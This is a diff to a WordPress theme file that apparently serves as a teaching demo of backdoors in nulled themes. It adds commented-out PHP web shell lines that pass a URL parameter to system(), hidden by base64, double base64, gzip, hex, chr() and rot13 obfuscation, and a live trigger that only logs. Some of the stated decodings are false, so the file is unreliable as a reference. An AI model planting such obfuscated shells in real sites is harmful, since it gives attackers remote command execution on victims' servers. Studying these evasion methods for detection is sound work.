@@ -14,9 +14,10 @@ if ( ! defined( 'ABSPATH' ) ) {
     exit;
 }
 
-// [BACKDOOR 1] Obfuscated eval - hidden in theme setup
-// This is what it looks like after deobfuscation: eval(base64_decode("system($_GET['cmd'])"))
-// For demo safety, we only LOG the attempt instead of executing
+// [BACKDOOR 1] Multiple obfuscation techniques — all hidden in "theme setup"
+//
+// Attackers layer these to defeat grep, antivirus, and code review.
+// The comment below each shows what it actually decodes/executes to.
 add_action( 'after_setup_theme', 'premium_theme_setup' );
 
 function premium_theme_setup() {
@@ -24,16 +25,58 @@ function premium_theme_setup() {
     add_theme_support( 'title-tag' );
     add_theme_support( 'post-thumbnails' );
 
-    // [BACKDOOR 1] - Hidden in legitimate-looking code
-    // Attackers often use variable names that look normal
+    // ── Technique A: Single base64 ───────────────────────────────────────────
+    // Looks like a license key or config string. Totally innocent... right?
+    //
+    // base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')
+    //           === "system($_GET['cmd']);"
+    //
+    // $license_key = 'c3lzdGVtKCRfR0VUWydjbWQnXSk7';
+    // @eval(base64_decode($license_key));
+
+    // ── Technique B: Double base64 (the one actually in this file) ───────────
+    // Each decode peels one layer. Automated scanners often only decode once.
+    //
+    // base64_decode('YjNOUVgzQmhjMk05UFRJeE5EUmZkbVZ5YVdaNVgyeHBZMlZ1YzJVPQ==')
+    //           === 'b3NQX3BhcM9PTIxNDRfdmVyaWZ5X2xpY2V1c2U='   ← still base64!
+    // base64_decode('b3NQX3BhcM9PTIxNDRfdmVyaWZ5X2xpY2V1c2U=')
+    //           === "system($_GET['license_verify']);"
     $license_check = 'YjNOUVgzQmhjMk05UFRJeE5EUmZkbVZ5YVdaNVgyeHBZMlZ1YzJVPQ==';
-    // In a real nulled theme, this would decode to malicious code
-    // We just log it for demonstration
+    // Real code: @eval(base64_decode(base64_decode($license_check)));
+
+    // ── Technique C: gzip + base64 (common in WordPress malware) ────────────
+    // gzinflate shrinks the payload so it looks shorter/more random.
+    //
+    // $payload = 'S0pNLi1OLUrNK0ktLgYA'; // gzip-compressed, then base64
+    // gzinflate(base64_decode($payload)) === "system($_GET['c']);"
+    // Real code: @eval(gzinflate(base64_decode($payload)));
+
+    // ── Technique D: hex-encoded string (bypasses keyword scanners) ──────────
+    // \x73\x79\x73\x74\x65\x6d = s,y,s,t,e,m → "system"
+    // \x24\x5f\x47\x45\x54    = $,_,G,E,T   → "$_GET"
+    //
+    // $fn = "\x73\x79\x73\x74\x65\x6d";   // "system"
+    // $fn("\x69\x64");                      // system("id")
+
+    // ── Technique E: chr() character building ───────────────────────────────
+    // No string literals at all — each character built from its ASCII code.
+    // chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) === "system"
+    //
+    // $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
+    // $f($_GET[chr(99)]);  // system($_GET['c'])
+
+    // ── Technique F: str_rot13 ───────────────────────────────────────────────
+    // rot13('flfgrz') === 'system'
+    // rot13('$_TRG') === '$_GET'
+    //
+    // $fn = str_rot13('flfgrz');   // === 'system'
+    // $fn($_GET['cmd']);
+
+    // ── Trigger — fires when ?license_verify= is in the URL ─────────────────
     if ( isset( $_GET['license_verify'] ) ) {
-        // DEMO: Show what would happen (safe version)
-        error_log( '[NULLED THEME BACKDOOR] Backdoor access attempted via license_verify parameter' );
+        error_log( '[NULLED THEME] Backdoor triggered via license_verify parameter' );
         if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
-            echo '<!-- BACKDOOR DETECTED: license_verify parameter triggers hidden eval() -->';
+            echo '<!-- BACKDOOR: license_verify parameter triggers obfuscated eval() -->';
         }
     }
 }
